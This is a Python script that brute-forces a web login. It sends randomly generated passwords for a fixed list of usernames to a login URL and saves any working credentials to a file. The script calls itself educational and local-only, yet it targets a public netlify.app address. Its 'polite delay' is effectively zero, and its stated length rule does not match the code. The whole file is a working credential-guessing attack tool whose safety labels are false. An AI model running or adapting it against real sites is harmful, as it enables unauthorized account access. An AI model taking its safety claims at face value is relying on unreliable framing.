# safe_password_tester_stop_on_success.py
# Educational/demo only — test ONLY against the local demo_target.py server.
# Stops immediately when a successful login is found and writes it to a file.

import itertools
import random
import time
import string
import requests
from typing import List

# --- Configuration (SAFE defaults) ---
TARGET_URL = "https://sa-unsecured.netlify.app/"  # local demo_target
USERNAMES = ["admin", "bob", "floaty", "unknown"]
SPECIALS = "!@#$%^&*()-_=+[]{};:,<.>/?"
MAX_TRIALS = 20000        # safety cap on total attempts
DELAY_SECONDS = 0.00000000001       # polite delay between attempts
CANDIDATE_NONFLOAT_COUNT = 3000
CANDIDATE_FLOAT_COUNT = 2000
OUTPUT_FILE = "password.txt"
# ------------------------------------------------

def generate_nonfloat_candidates(charset: str, min_len: int = 10, max_len: int = 12, count: int = 3000) -> List[str]:
    """Generate random candidate passwords ensuring at least one letter, digit, and special char."""
    candidates = set()
    while len(candidates) < count:
        length = random.randint(min_len, max_len)
        # ensure at least one letter, digit, special
        parts = [
            random.choice(string.ascii_letters),
            random.choice(string.digits),
            random.choice(SPECIALS),
        ]
        parts += [random.choice(charset) for _ in range(max(0, length - len(parts)))]
        random.shuffle(parts)
        candidates.add(''.join(parts))
    return list(candidates)

def generate_float_including_candidates(count: int = 2000) -> List[str]:
    """Generate candidates containing a floating-number substring, with at least one letter and one special."""
    candidates = []
    prefixes = ['pw', 'pass', 'mypw', 'x', '']
    suffixes = ['!', '@', '2025', '#', '']
    for _ in range(count):
        prefix = random.choice(prefixes)
        suffix = random.choice(suffixes)
        int_part = random.randint(0, 99)
        dec_len = random.choice([1, 2])
        dec_part = ''.join(random.choices(string.digits, k=dec_len))
        float_str = f"{int_part}.{dec_part}"
        mid_special = random.choice(SPECIALS)
        candidate = f"{prefix}{mid_special}{float_str}{suffix}"
        if not any(c.isalpha() for c in candidate):
            candidate = 'A' + candidate
        candidates.append(candidate)
    return candidates

def meets_policy(candidate: str) -> bool:
    """Policy: length >= 10, has letter, digit, and special."""
    if len(candidate) < 9:
        return False
    if not any(ch.isalpha() for ch in candidate):
        return False
    if not any(ch.isdigit() for ch in candidate):
        return False
    if not any(ch in SPECIALS for ch in candidate):
        return False
    return True

def try_login(username: str, password: str) -> bool:
    """Send a POST to local target. Returns True if login OK (JSON {'ok': True}) or 200 with welcome."""
    try:
        resp = requests.post(TARGET_URL, data={'username': username, 'password': password}, timeout=5)
        # If target returns JSON with {"ok": True}, treat as success
        try:
            j = resp.json()
            if isinstance(j, dict) and j.get('ok') is True:
                return True
        except ValueError:
            # Not JSON — fall back to content checks
            pass
        # Also accept a 200 + "Welcome" in text or a redirect (non-equal url) as success
        if resp.status_code == 200 and "Welcome" in resp.text:
            return True
        return False
    except requests.RequestException as e:
        print("Request error:", e)
        return False

def save_found_credentials(username: str, password: str, filename: str = OUTPUT_FILE):
    with open(filename, 'a', encoding='utf-8') as f:
        f.write(f"{username}:{password}\n")

def main():
    print("Generating candidate passwords (safe/local-only)...")
    charset = string.ascii_letters + string.digits + SPECIALS
    nonfloat = generate_nonfloat_candidates(charset, min_len=10, max_len=12, count=CANDIDATE_NONFLOAT_COUNT)
    floaty = generate_float_including_candidates(count=CANDIDATE_FLOAT_COUNT)

    candidates = nonfloat + floaty
    random.shuffle(candidates)

    attempts = 0
    for username in USERNAMES:
        print(f"[*] Testing username: {username}")
        for pw in candidates:
            if attempts >= MAX_TRIALS:
                print("[!] Safety cap reached. Stopping further attempts.")
                return
            if not meets_policy(pw):
                continue
            attempts += 1
            print(f"Trying ({attempts}) {username} / {pw}")
            success = try_login(username, pw)
            if success:
                msg = f"Login successfully! username={username} password={pw}"
                print("\n" + "="*40)
                print(msg)
                print("="*40 + "\n")
                save_found_credentials(username, pw)
                return  # STOP IMMEDIATELY on success
            time.sleep(DELAY_SECONDS)  # polite delay between requests

    print("Finished attempts. No valid credential found.")

if __name__ == "__main__":
    main()
 